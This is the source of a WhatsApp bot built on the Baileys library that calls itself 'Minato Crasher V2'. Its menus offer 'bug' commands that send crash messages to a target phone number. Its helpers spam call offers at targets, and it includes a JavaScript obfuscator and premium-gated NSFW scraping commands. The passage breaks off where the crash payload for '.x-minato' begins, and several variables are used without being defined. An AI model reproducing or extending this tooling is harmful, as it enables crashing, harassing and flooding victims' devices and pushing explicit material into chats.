
//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./database/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const babi = fs.readFileSync('./image/Minato.jpeg')
const imageList = [
    "https://files.catbox.moe/255j5m.jpg",
    "https://files.catbox.moe/597yyz.jpg",
    "https://files.catbox.moe/13vnvn.jpg",
    "https://files.catbox.moe/78h6kv.jpg",
    "https://files.catbox.moe/qzrvol.jpg",
    "https://files.catbox.moe/ze9frw.jpg"
];

// Pilih gambar secara acak dari array
const randomimageMinatoXx = imageList[Math.floor(Math.random() * imageList.length)];

let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/id76qx.jpg"
const Xxx = "https://h.top4top.io/p_3301ml5m70.jpg"

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')
//END

//DATA ADDBOT / JADIBOT PAIRING
const {
	jadibot,
	stopbot,
	listjadibot
} = require('./database/jadibot')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await sock.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await sock.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
//SEND SPAM PAIRING
//END
//SEND CALL
async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await sock.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END

//BUTTON MESSAGE ( NOT WORK )
sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE

const Zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: babi,
					itemCount: `666`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫🩸`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: false
			}
		}
		
		const Reply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫🩸`,
                body: `Cello Official🩸`,
                mediaType: 3,
                renderLargerThumbnail: true,
                thumbnailUrl: ThumbUrl,
                sourceUrl: `https://whatsapp.com/channel/0029Vb43YHqBVJlD6VYefA3w`
            }
        }
    }, { quoted: Zets });
}

const ReplyRap = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸 `,
                body: `Cello Official`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: randomimageMinatoXx,
                sourceUrl: `https://youtube.com/@CelloOffical`
            }
        }
    }, { quoted: lol });
}

const ThumbUrl = "https://files.catbox.moe/70ovrw.jpg"
const XQuoted = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": randomimageMinatoXx },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": " MinatoWoii",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://h.top4top.io/p_3301ml5m70.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " MinatoWoii",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}
const qloc = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'イNoCounter!!',
                    "jpegThumbnail": ''
                          }
                        }
                      }
//END
//REPLY MESSAGE
const ReplyImage = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸̴༑`,
                body: `Cello Official`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: randomimageMinatoXx,
                sourceUrl: `https://youtube.com/`
            }
        }
    }, { quoted: m });
}

//END
//STIKER AND BRAT FUNCTION

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸̴༑`,
                    body: `MinatoVvil`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@CelloOffical`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRap('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "",
      status: "INQUIRY",
      surface: "",
      message: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸̴༑`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363377315992827@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363377315992827@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
//END

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }

const RunTime = `_${runtime(process.uptime())}_`
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
//ALL MENU CASE {
case 'menu': {
let limitnya = useLimit
let Menu = `
> [ ⼢ ] Hi Konnichiwa, watashi wa\nMinato Invisible ga sakusei shita WhatsApp Botts de, uebu saito o kõgeki suru kinō o motte imasuga.\n▷ Action : w.ceo/CelloOfficial\n▷Version : 2.0.0\n▷ Library : WhiskeyBaylies\n▷ Type : JavaScript
` 
sock.sendMessage(m.chat, {
  image: { url: randomimageMinatoXx }, //gif nya
        caption: Menu,
        footer: "© Cello Official - Minato Crasher",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸̴`,
                body: `® Cello Official`,
                thumbnailUrl: randomimageMinatoXx,
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
    buttonId: ".bugmenu", 
    buttonText: { 
      displayText: '𝐁͢𝐮͠𝐠𝐬̛͜𝐌𝐞̈́͟𝐧̶𝐮' 
    }
  }, {
    buttonId: ".funmenu", 
    buttonText: {
      displayText: "𝐅͢𝐮͡𝐧̷𝐌̄͟𝐞𝐧̈́͟𝐮"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break
case 'bugmenu': {
let limitnya = useLimit
let Menu = `
> [ ⼢ ] Hi Konnichiwa, watashi wa\nMinato Invisible ga sakusei shita WhatsApp Botts de, uebu saito o kõgeki suru kinō o motte imasuga.\n▷ Action : w.ceo/CelloOfficial\n▷Version : 2.0.0\n▷ Library : WhiskeyBaylies\n▷ Type : JavaScript
` 
sock.sendMessage(m.chat, {
  image: { url: randomimageMinatoXx }, //gif nya
        caption: Menu,
        footer: `  \`[ 𝐁𝐔𝐓𝐓𝐎𝐍 𝐁𝐔𝐆 ]\`
유 _.x-minato_ *‹62xxz›*
  \`𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄\`
유 _.xinvisible_ *‹62xxz›*
유 _.minato-system *‹62xxz›*
유 _.xghsot_ *‹62xxz›*
유 _.inconspicuous_ *‹62xxz*›`,
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸̴`,
                body: `® Cello Official`,
                thumbnailUrl: randomimageMinatoXx,
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
       {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝐁̽𝐚͢͡𝐜̷𝐤' 
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break

case 'funmenu': {
let limitnya = useLimit
let Menu = `
> [ ⼢ ] Hi Konnichiwa, watashi wa\nMinato Invisible ga sakusei shita WhatsApp Botts de, uebu saito o kõgeki suru kinō o motte imasuga.\n▷ Action : t.me/CelloOfficial2\n▷Version : XxInvisible\n▷ Library : WhiskeyBaylies\n▷ Type : JavaScript
  
  \`[ 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 ]\`
유 _.brat_
유 _.hidetag_
유 _.kick_
유 _.linkgroup_
유 _.resetlinkgc_
유 _.ocr_
  \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔\`
유 _.tiktok_
유 _.tourl_
유 _.rvo_
  \`𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔\`
유 _.nsfw_
유 _.hentaineko_
유 _.r34_
  \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\`
유 _.addacces_
유 _delacces_
유 _ceo_
유 _delceo_

` 
sock.sendMessage(m.chat, {
  image: { url: randomimageMinatoXx }, //gif nya
        caption: Menu,
        footer: "© Cello Official",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `MinatoVvil`,
                body: `® Cello Official`,
                thumbnailUrl: randomimageMinatoXx,
                sourceUrl: "www.pornhub.com",
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
     {
    buttonId: ".menu", 
    buttonText: { 
      displayText: '𝐁̽𝐚͢͡𝐜̷𝐤' 
    }
  }, {
    buttonId: ".ownerdev", 
    buttonText: {
      displayText: "𝐃͟𝐞𝐯̂𝐞̋͢𝐥𝐨̷𝐩𝐞̬𝐫"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: lol })
}
break


/** WhiteList **/
    

case 'ownerdev': {
let name = m.pushName || sock.getName(m.sender);
let pan = `
> 𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸✰
`;
const url = randomimageMinatoXx
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: sock.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: randomimageMinatoXx } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Cello Official',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏━━━[ \`𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢\` ]━━━┓
┃么 CELLO OFFICIAL [DEVELOPER]
┃么 BINTANG OFFICIAL [BEST FRIENDS]
┃么 SHADOW OFFICIAL [BEST FRIENDS]
┃么 KYZZ BOTAK [BEST FRIENDS]
┃么 ALL DEV [MY FRIENDS]
┗━━━━━━━━━━━━━━━━━┛`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer Minato ( sock )","url":"https://t.me/CelloOfficial2","merchant_url":"https://t.me/CelloOfficial2"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: randomimageMinatoXx } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆「 *\`[CHANNEL OFC]\`* 」
┣───────────────┈ 
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Saluran Cello Official","url":"https://whatsapp.com/channel/0029Vb43YHqBVJlD6VYefA3w","merchant_url":"https://whatsapp.com/channel/0029Vb43YHqBVJlD6VYefA3w"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await sock.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
			case 'r34': {
			if (!PremOnly) return ReplyRap("*You are not a Premium User*");	
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					sock.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image From Minato\n\n*Powered By Minato Ganteng*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		case 'hentaineko':

if (!PremOnly) return ReplyRap("*You are not a Premium User*");
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
sock.sendMessage(m.chat, { caption: "sangean lu jir", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	if (!PremOnly) return ReplyRap("*You are not a Premium User*");
        	ReplyRap(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			sock.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break

case 'x-minato':
case 'type-bug': {
    if (!PremOnly) return ReplyRap("*You are not a Premium User*");
    if (!q) return ReplyRap(`Example ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");

    if (jidx.startsWith('0')) {
        return ReplyRap(`Example: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    sock.sendMessage(m.chat, {
        caption: "𝐒͢𝐞𝐥𝐞𝐜𝐭 𝐁𝐮𝐠༑",
        image: { url: randomimageMinatoXx },
        footer: "© 𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸",
        buttons: [
            {
                buttonId: `.menu`,
                buttonText: { displayText: '𝐁̽𝐚͢͡𝐜̷𝐤' },
                type: 1,
                viewOnce: true
            },
            {
                buttonId: '.ownerdev',
                buttonText: { displayText: '𝐃͟𝐞𝐯̂𝐞̋͢𝐥𝐨̷𝐩𝐞̬𝐫' },
                type: 1,
                viewOnce: true
            },
            {
                buttonId: '.hidetag kamu mana punya😂',
                buttonText: { displayText: 'Weladalah' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: "𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🇷🇺",
                        sections: [
                            {
                                title: "𝐌𝐢𝐧𝐚𝐭𝐨 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟐🩸༑🩸",
                                highlight_label: "",
                                rows: [
                                    {
